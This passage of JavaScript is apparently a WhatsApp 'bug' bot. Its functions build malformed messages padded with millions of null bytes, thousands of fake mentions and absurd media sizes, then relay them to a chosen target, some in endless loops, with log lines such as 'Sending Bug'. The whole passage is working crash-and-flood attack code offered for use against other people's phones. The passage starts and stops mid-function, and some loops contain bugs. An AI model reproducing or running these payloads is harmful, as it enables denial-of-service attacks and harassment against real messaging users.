          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target } }
            ]
          }
        ]
      }
    ]
  });
  const viewOnceMsg = generateWAMessageFromContent(
  "status@broadcast",
  {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "X",
            format: "BOLD"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(1000000),
            version: 3
          }
        }
      }
    }
  },
  {}
);
await sock.relayMessage(
  "status@broadcast",
  viewOnceMsg.message,
  {
    messageId: viewOnceMsg.key.id,
    statusJidList: [target]
  }
);
console.log(chalk.red(`Succes Send ${target}`));
}

async function TrueNullv3(target) {
  const module = {
    message: {
      ephemeralMessage: {
        message: {
          audioMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
            mimetype: "audio/mpeg",
            fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
            fileLength: 999999999999999999,
            seconds: 9999999999999999999,
            ptt: true,
            mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
            fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
            directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0",
            mediaKeyTimestamp: 99999999999999,
            contextInfo: {
              mentionedJid: [
                "13300350@s.whatsapp.net",
                target,
                ...Array.from({ length: 1900 }, () =>
                  `1${Math.floor(Math.random() * 90000000)}@s.whatsapp.net`
                )
              ],
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "1@newsletter",
                serverMessageId: 1,
                newsletterName: "X"
              }
            },
            waveform: "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg=="
          }
        }
      }
    }
  };

  const Content = generateWAMessageFromContent(
    target,
    module.message,
    { userJid: target }
  );

  await sock.relayMessage("status@broadcast", Content.message, {
    messageId: Content.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }]
  });

  const viewOnceMsg = generateWAMessageFromContent(
    "status@broadcast",
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { text: "X", format: "BOLD" },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(1000000),
              version: 3
            }
          }
        }
      }
    },
    {}
  );
  await sock.relayMessage("status@broadcast", viewOnceMsg.message, {
    messageId: viewOnceMsg.key.id,
    statusJidList: [target]
  });
  const ButtonMessage = {
    url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
    mimetype: "audio/mpeg",
    fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
    fileLength: 9999999999,
    seconds: 999999999999,
    ptt: true,
    mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
    fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
    directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0",
    mediaKeyTimestamp: 99999999999999,
    waveform: "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg==",
    contextInfo: {
      mentionedJid: [
        "1@s.whatsapp.net",
        target,
        ...Array.from({ length: 9999 }, () =>
          `1${Math.floor(Math.random() * 9e7)}@s.whatsapp.net`
        )
      ],
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
        newsletterJid: "1@newsletter",
        serverMessageId: 1,
        newsletterName: "X"
      }
    }
  };

  const msg = generateWAMessageFromContent(
    target,
    { ephemeralMessage: { message: { ButtonMessage } } },
    { userJid: target }
  );

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }]
  });

  const PaymentMessage = generateWAMessageFromContent(
    "status@broadcast",
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { text: "X", format: "BOLD" },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(1_000_000),
              version: 3
            }
          }
        }
      }
    },
    {}
  );

  await sock.relayMessage("status@broadcast", PaymentMessage.message, {
    messageId: PaymentMessage.key.id,
    statusJidList: [target]
  });

  console.log(chalk.red(`Succes Send ${target}`));
}

async function delayvisibSpam(target, mention) {
console.log(chalk.red(`𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));
  let biji = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "σƭαא ɦαเ",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          },
          entryPointConversionSource: "galaxy_message"
        }
      }
    }
  }, {
    ephemeralExpiration: 0,
    forwardingScore: 0,
    isForwarded: false,
    font: Math.floor(Math.random() * 9),
    background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0")
  });

  await sock.relayMessage("status@broadcast", biji.message, {
    messageId: biji.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined }
            ]
          }
        ]
      }
    ]
  });

  if (mention) {
    while (true) {
      await sock.relayMessage(target, {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: biji.key,
              type: 25
            }
          }
        }
      }, {});
    }
  }
}

async function Truenullv4(target, ptcp = true) {
  const VidMessage = generateWAMessageFromContent(target, {
    videoMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
      mimetype: "video/mp4",
      fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
      fileLength: "289511",
      seconds: 15,
      mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
      caption: "\n",
      height: 640,
      width: 640,
      fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
      directPath:
      "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1743848703",
      contextInfo: {
        isSampled: true,
        participant: target,
        mentionedJid: [
          ...Array.from(
            { length: 1900 },
            () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
          ),
        ],
        remoteJid: "target",
        forwardingScore: 100,
        isForwarded: true,
        stanzaId: "123456789ABCDEF",
        quotedMessage: {
          businessMessageForwardInfo: {
            businessOwnerJid: "0@s.whatsapp.net",
          },
        },
      },
      streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
      thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
      thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
      thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
      },
    }, 
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    }
  );
  
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: VidMessage.message,
     },
    }, ptcp ? 
    { 
      messageId: VidMessage.key.id, 
      participant: { jid: target} 
    } : { messageId: VidMessage.key.id }
  );
  
  const payload = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "X", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: "\x10".repeat(1045000),
            version: 3
          },
          entryPointConversionSource: "call_permission_request"
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    },
  );
  
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: payload.message,
     },
    }, ptcp ? 
    { 
      messageId: payload.key.id, 
      participant: { jid: target} 
    } : { messageId: payload.key.id }
  );
  
  const payload2 = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "\n", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\x10".repeat(1045000),
            version: 3,
          },
          entryPointConversionSource: "call_permission_message"
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    },
  );

  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: payload2.message,
     },
    }, ptcp ? 
    { 
      messageId: payload2.key.id, 
      participant: { jid: target} 
    } : { messageId: payload2.key.id }
  );
}

async function buttonDelay(target) {
  try {
   
    const buttonList = [
      {
        name: "single_select",
        buttonParamsJson: JSON.stringify({ label: "Select Option" })
      },
      {
        name: "call_permission_request",
        buttonParamsJson: JSON.stringify({ request: true }),
        message_with_link_status: true
      },
      {
        name: "payment_method",
        buttonParamsJson: "{}"
      },
      {
        name: "payment_status",
        buttonParamsJson: "{}"
      },
      {
        name: "review_order",
        buttonParamsJson: "{}"
      }
    ];

    for (let x = 1; x <= 100; x++) {

      const payload = {
        header: { title: "", hasMediaAttachment: false },
        body: { text: `Knoww Me Ridz?` },
        nativeFlowMessage: {
          documentMessage: {
            carouselMessage: {
              messageParamsJson: JSON.stringify({
                name: "galaxy_message",
                title: "galaxy_message",
                header: "Ridz",
                body: `Testing Galaxy`
              }),
              buttons: buttonList
            }
          }
        }
      };

      const GalaxyMessage = {
        groupStatusMessageV2: {
          message: {
            interactiveResponseMessage: {
              body: { text: `Galaxy Test Update` },
              contextInfo: { mentionedJid: [] }
            }
          }
        },
        extendedTextMessage: {
          text: JSON.stringify(payload)
        }
      };

      await sock.relayMessage(target, GalaxyMessage, {});
    }

  } catch (err) {
    console.error("Error:", err);
  }
}

async function locaDelay(target) {
  try {
    const payload = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {},

          interactiveResponseMessage: {
            body: {
              text: "Know Me?",
              format: "DEFAULT"
            },

            nativeFlowResponseMessage: {
              name: "",
              paramsJson: JSON.stringify({ info: "Ēksò4¡X information" }),
              version: 3
            },

            groupStatusMessageV2: {
              message: {
                locationMessage: {
                  degreesLatitude: 12.3456,
                  degreesLongitude: 65.4321,
                  name: "Faridz?",
                  address: "-RIDZ",
                  isLive: false
                }
              }
            },

            contextInfo: {
              participant: target,
              isForwarded: false,
              forwardingScore: 0,

              forwardedNewsletterMessageInfo: {
                newsletterName: "",
                newsletterJid: "999999999@newsletter",
                serverMessageId: 1
              },

              mentionedJid: [target]
            }
          }
        }
      }
    };

    const msg = generateWAMessageFromContent(target, payload, {});

    await sock.relayMessage(target, msg.message, {
      messageId: msg.key.id
    });

    console.log("[ SUCCES SEND BUG BY Ryanzz💸]");

  } catch (e) {
    console.error("Eror Functions:", e);
  }
}

async function tesfang(target) {
  for (let i = 1; i <= 75; i++) {
    try {

      const payload = {
        groupStatusMessageV2: {
          message: {
            imageMessage: {
              url: "https://mmg.whatsapp.net/o1/v/t24/f2/m232/AQNVJiaPtq4Sbf8CxOoOzzjG0MhQfcEYp5a3RFKcWBSVcbpL-t5yDfR0nH5aJAUinpDS6rCsfN--747mOTiF-oaiO97W41SndL8DiveF6w?ccb=9-4&oh=01_Q5Aa3AE1L5Iz4vV7dLKJBsOGPtCrs08G_-y0L0rO6KMSMEj4rg&oe=694A1259&_nc_sid=e6ed6c&mms3=true",
              mimetype: "image/jpeg",
              fileSha256: "DqRi9X3lEDH7WJSqb6E1njeawZZkIg8DTHZgdIga+E8=",
              fileLength: "72103",
              mediaKey: "Mt4oRen73PaURrUvv9vLJTPNBQoUlbNNtVr4D7FziAw=",
              fileEncSha256: "okpg3oYPwe/ndLcMdIPy0gtyYl/wvC9WurHeekXWTOk=",
              directPath: "/o1/v/t24/f2/m232/AQNVJiaPtq4Sbf8CxOoOzzjG0MhQfcEYp5a3RFKcWBSVcbpL-t5yDfR0nH5aJAUinpDS6rCsfN--747mOTiF-oaiO97W41SndL8DiveF6w?ccb=9-4&oh=01_Q5Aa3AE1L5Iz4vV7dLKJBsOGPtCrs08G_-y0L0rO6KMSMEj4rg&oe=694A1259&_nc_sid=e6ed6c",
              mediaKeyTimestamp: "1763881206",
              width: -999,
              height: 999,
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2MBERISGBUYLxoaL2NCOEJjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY//AABEIACAAIAMBEQACEQEDEQH/xAGiAAABBQEBAQEBAQAAAAAAAAAAAQIDBAUGBwgJCgsQAAIBAwMCBAMFBQQEAAABfQECAwAEEQUSITFBBhNRYQcicRQygZGhCCNCscEVUtHwJDNicoIJChYXGBkaJSYnKCkqNDU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6g4SFhoeIiYqSk5SVlpeYmZqio6Slpqeoqaqys7S1tre4ubrCw8TFxsfIycrS09TV1tfY2dri4+Tl5ufo6ery8/T19vf4+fr/2gAMAwEAAhEDEQA/AFvLtYDtyNx556AetZmhz0+ozTTcu3XjaSF/AU7CuLaajcW08eJGxxlXJC8/0xTsFzsLO4jniDxHgcEehoTBnLas4aZl9CC5I6HHr+dICzoelrdxRX9xKNkU4LndnaoHGQOmTjOcYA96bBWF/wCEf2aK11P5scyp5uQhOOhA9uM5OOPw5AaRY8LyTmB1c5hz8vOSG4/of89wRR1i0kJJOAmMgjqSMcH65NJDZreEbqFrFbJHVJcmR0KEFl9Qeh6j8sY70McS14ruoU042G1nnnwFjj6gDnPTpkDjvQgbKWhwrDp4ZZmYSYJBxhWAwcHvyD/nmmJD5TBKrLKm7HsMGkBY0mO2Rbq5lRQ+VXex6Ak9+w79unNO2moK99BNRtrJ4Y7mNcywv5eSDxxn2PGMe3PeklZBJ6jFuo9mWyOnvQFz/9k=",
              contextInfo: {
                pairedMediaType: "NOT_PAIRED_MEDIA"
              },
              annotations: [
                {
                  polygonVertices: [
                    { x: 60.7, y: -36.39 },
                    { x: -16.71, y: 49.26 },
                    { x: -56.58, y: 37.85 },
                    { x: 20.84, y: -47.80 }
                  ],
                  newsletter: {
                    newsletterJid: "120363420757607688@newsletter",
                    newsletterName: "Ēksò¡x Neverdie",
                    contentType: "UPDATE",
                    accessibilityText: ""
                  }
                }
              ]
            }
          }
        }
      };

      await sock.relayMessage(target, payload, {});

    } catch (e) {
      console.log("Error:", e);
    }
  }
}

async function despiczy(target) {
  let war = {
       viewOnceMessage: {
             message: {
                  locationMessage: {
                       degreesLatitude: 9999999,
                       degreesLongitude: -999999,
                       name: "\u0000".repeat(60000), 
                          inviteLinkGroupTypeV2: "DEFAULT",
                          clickToWhatsappCall: true,
                          contextInfo: {
                             remoteJid: "status@broadcast",
                             participant: "null",
                             mentionedJid: [
                               target,
                               "0@s.whatsapp.net",
                               ...Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random() * 5000000) +
                        "@s.whatsapp.net"
                               ),
                           ],
                           businessMessageForwardInfo: {
                              businessOwnerJid: "null"
                            }
                         },
                        interactiveResponseMessage: {
                           header: {
                              text: "Come On Baby" + "ꦽ".repeat(70000),
                           },
                            nativeFlowResponseMessage: {
                                name: "send_location", 
                                buttonParamsJson: JSON.stringify({
                                  display_text: "fefek" + "ꦽ".repeat(50000)
                                })
                             }
                         }
                     }
                 }
             }
         };
         
 let war2 = {
      viewOnceMessage: {
            message: {
                 stickerMessage: {
                     url: "https://mmg.whatsapp.net/o1/v/t24/f2/m232/AQM0qk2mbkdEyYjXTiq8Me6g5EDPbTWZdwL8hTdt4sRW3GcnYOxfEDQMazhPBpmci3jUgkzx5j1oZLT-rgU1yzNBYB-VtlqkGX1Z7HCkVA",
                     fileSha256: "1nmk47DVAUSmXUUJxfOD5X/LwUi0BgJwgmCvOuK3pXI=",
                     fileEncSha256: "LaaBTYFkIZxif2lm2TfSIt9yATBfYd9w86UxehMa4rI=",
                     mediaKey: "7XhMJyn+ss8sVb2qs36Kh9+lrGVwu29d1IO0ZjHa09A=",
                     mimetype: "image/webp",
                     height: 9999,
                     width: 9999,
                     directPath: "/o1/v/t24/f2/m232/AQM0qk2mbkdEyYjXTiq8Me6g5EDPbTWZdwL8hTdt4sRW3GcnYOxfEDQMazhPBpmci3jUgkzx5j1oZLT-rgU1yzNBYB-VtlqkGX1Z7HCkVA",
                     fileLength: "22254",
                     mediaKeyTimestamp: "1761396583",
                     isAnimated: false,
                     stickerSentTs: Date.now(),
                     isAvatar: false,
                     isAiSticker: false,
                     isLottie: false,
                     contextInfo: {
                        participant: target,
                        mentionedJid: [
                           target,
                           ...Array.from({ length: 1900 }, () => 
                            "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                          )
                       ],
                       remoteJid: "X",
                          stanzaId: "1234567890ABCDEF",
                             quotedMessage: {
                               albumInviteMessage: {
                                  serviceType: 3,
                                  expiryTimestamp: Date.now() + 1814400000
                               }
                           }
                       }
                   }
               }
           }
       };
       
 let war3 = {
      groupStatusMentionMessageV2: {
            message: {
                 pollResultSnapshotMessage: {
                      pollCreationMessageKey: {
                         remoteJid: target,
                         fromMe: true,
                         id: "xnxx.com"
                      },
                      documentMessage: {
                         url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                         mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                         fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                         fileLength: "9999999999999",
                         pageCount: 9007199254740991,
                         mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
                         fileName: "Syukhronཀ",
                         fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
                         directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                         mediaKeyTimestamp: "1723855952",
                         contactVcard: false,
                         thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                         thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                         thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                         jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABERERESERMVFRMaHBkcGiYjICAjJjoqLSotKjpYN0A3N0A3WE5fTUhNX06MbmJiboyiiIGIosWwsMX46/j///8BERERERIRExUVExocGRwaJiMgICMmOiotKi0qOlg3QDc3QDdYTl9NSE1fToxuYmJujKKIgYiixbCwxfjr+P/////CABEIAGAARAMBIgACEQEDEQH/xAAnAAEBAAAAAAAAAAAAAAAAAAAABgEBAAAAAAAAAAAAAAAAAAAAAP/aAAwDAQACEAMQAAAAvAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAf/8QAHRAAAQUBAAMAAAAAAAAAAAAAAgABE2GRETBRYP/aAAgBAQABPwDxRB6fXUQXrqIL11EF66iC9dCLD3nzv//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQIBAT8Ad//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8Ad//Z"
                     },
                     contextInfo: {
                        participant: target,
                        mentionedJid: [
                           target,
                           "0@s.whatsapp.net",
                           ...Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")
                       ]
                   }
               }
           }
       }
   };
   
   const ara = [
     generateWAMessageFromContent(target, msg, {}),
     generateWAMessageFromContent(target, war2, {}),
     generateWAMessageFromContent(target, war3, {})
   ];
   
     for (const awh of ara) {
       await sock.relayMessage("status@broadcast", awh, {
         messageId: null,
         statusJidList: [target],
       });
    }
    
   await sock.relayMessage(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "X",
              format: "BOLD"
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(10000000),
              version: 3
            }
          }
        }
      }
    },
    {}
  );
  console.log(chalk.red(`Sending Bug ${target}`));
}

async function CardsResp(target) {
  const cards = [];
  for (let z = 0; z = 100; z++) {
    const header = {
      title: "7eppeli.pdf", 
      videoMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/12149372_10035125079888877_2626754303498270911_n.enc?ccb=11-4&oh=01_Q5Aa1wFIr19qtg1EEatsDh09AHko83pYR8bYGzU7Wc9zCWh48Q&oe=68726852&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "d0JIqFXbkYr7Q0BsVZB8ofnTO0JZYauyDGLNopgLfNo=",
        fileLength: 2502200825022008,
        seconds: 77777777,
        mediaKey: "wuED6VegoqlOHx9IZYQjMj3ySrhgtpJs/NlzrlXgCck=",
        height: 1088,
        width: 736,
        fileEncSha256: "KGszaobqQ8QKFOp1UrgqvRp54SEhCNfyp8/dfLqbFVs=",
        directPath: "/v/t62.7161-24/12149372_10035125079888877_2626754303498270911_n.enc?ccb=11-4&oh=01_Q5Aa1wFIr19qtg1EEatsDh09AHko83pYR8bYGzU7Wc9zCWh48Q&oe=68726852&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1749737059",
        contextInfo: {},
        streamingSidecar: "xey0UW72AH+ShCjYXVzOom/k+kt7VJryEZ+yNyAarqVJHx8L4j6sB4Da5ZGHXTfzX9g=",
        thumbnailDirectPath: "/v/t62.36147-24/19977827_1442378506945978_3754389976888828856_n.enc?ccb=11-4&oh=01_Q5Aa1wGz9o9ukGbtWxoetr_ygoJDy0SN80KaAwJ1vywXvbTH8A&oe=687247F9&_nc_sid=5e03e0",
        thumbnailSha256: "hxKrzb6DDC8qTu2xOdeZN4FBgHu8cmNekZ+pPye6dO0=",
        thumbnailEncSha256: "Es1ZWpjDKRZ82XpiLARj3FZWh9DeFCEUG2wU8WHWrRs=",
        annotations: [
          {
            embeddedContent: {
              embeddedMusic: {
                musicContentMediaId: "1942620729844671",
                songId: "432395962368430",
                author: "Yuukey Da",
                title: "Уччкеу Дїшауи Жіьпарріп",
                artworkDirectPath: "/v/t62.76458-24/11810390_1884385592310849_8570381233425191298_n.enc?ccb=11-4&oh=01_Q5Aa1wFo3eosJQYj_I0wJby373H-MKodRwdx1sCOEt426yyLCg&oe=687233BB&_nc_sid=5e03e0",
                artworkSha256: "8x8ENCxJyIrSFnF9ZHtiim423uGgPleSm8zPEbQZByE=",
                artworkEncSha256: "HlsJKALVejvghjYZIrY46zosCX568b1cG9SzzZfCPNA=",
                artistAttribution: "",
                countryBlocklist: "",
                isExplicit: false,
                artworkMediaKey: "0DsOnYZAyNwPJgs5PZwL/EtFxBXO2cW9zwLYZGcAkvU="
              }
            },
            embeddedAction: true
          }
        ]
      }, 
      hasMediaAttachment: true, 
    };
    cards.push({
      header, 
      nativeFlowMessage: {
        buttons: [{
          name: ""
        }], 
        messageVersion: 3
      }
    })
  }
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          body: { 
            text: "7eppeli.pdf"
          },
          carouselMessage: {
            cards
          },
          contextInfo: {
            mentionedJid: Array.from({ length:2000 }, (_, z) => `628${z+1}@s.whatsapp.net`),
            participant: "0@s.whatsapp.net",
            isGroupMention: true,            
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(1000000)}\"}`, 
                      version: 3
                    }
                  }
                }
              }
            },
            remoteJid: "status@broadcast"
          }
        }
      }
    }
  }, {});

  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
}

async function XStromBulldozerX(target, mention) {
  let parse = true;
  let SID = "5e03e0";
  let key = "10000000_2203140470115547_947412155165083119_n.enc";
  let Buffer = "01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe";
  let type = `image/webp`;
  if (11 > 9) {
    parse = parse ? false : true;
  }

  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: `https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=${Buffer}=68917910&_nc_sid=${SID}&mms3=true`,
          fileSha256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
          fileEncSha256: "dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=",
          mediaKey: "C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=",
          mimetype: type,
          directPath: `/v/t62.43144-24/${key}?ccb=11-4&oh=${Buffer}=68917910&_nc_sid=${SID}`,
          fileLength: {
            low: Math.floor(Math.random() * 1000),
            high: 0,
            unsigned: true,
          },
          mediaKeyTimestamp: {
            low: Math.floor(Math.random() * 1700000000),
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            participant: target,
            mentionedJid: [
              "131338822@s.whatsapp.net",
              ...Array.from(
                { length: 1900 },
                () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
            remoteJid: "X",
            participant: target,
            stanzaId: "1234567890ABCDEF",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 1814400000
              },
            },
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: Math.floor(Math.random() * -20000000),
            high: 555,
            unsigned: parse,
          },
          isAvatar: parse,
          isAiSticker: parse,
          isLottie: parse,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
  
  if (mention) {
    await sock.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25
            }
          }
        }
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "" },
            content: undefined
          }
        ]
      }
    );
  }
}

//Ios
async function CtcBizArray(target) {
  const contacts = [];
